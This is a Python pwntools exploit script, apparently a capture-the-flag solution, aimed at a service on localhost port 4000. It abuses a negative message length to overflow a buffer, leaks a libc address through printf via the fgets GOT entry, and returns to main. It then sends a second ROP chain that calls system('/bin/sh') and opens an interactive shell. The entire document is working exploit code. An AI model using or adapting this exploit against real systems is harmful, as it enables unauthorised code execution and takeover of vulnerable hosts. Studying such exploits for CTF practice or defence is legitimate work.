#!/usr/bin/env python
from pwn import *

r = remote('127.0.0.1', 4000)
#libc = ELF('libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')
libc = ELF('/lib32/libc.so.6')

printf_plt = 0x08048430
fgets_got = 0x804a014
fgets_off = libc.symbols['fgets']
system_off = libc.symbols['system']
main = 0x080485ca

r.sendlineafter('Message Length >> ', '-112')

rop = p32(printf_plt) + p32(main) + p32(fgets_got)
r.sendlineafter('Name >> ', 'A'*32 + rop)

# leak libc base address
r.recvuntil('Message : \n')
libc_base = u32(r.recvn(4)) - fgets_off
system = libc_base + system_off
binsh = libc_base + next(libc.search('/bin/sh\x00'))
print 'libc base: ', hex(libc_base)

#======== ret to main to exploit again, this time we have system ========

r.sendlineafter('Message Length >> ', '-112')

rop = p32(system) + p32(0xdeadbeef) + p32(binsh)
r.sendlineafter('Name >> ', 'A'*32 + rop)

r.interactive()
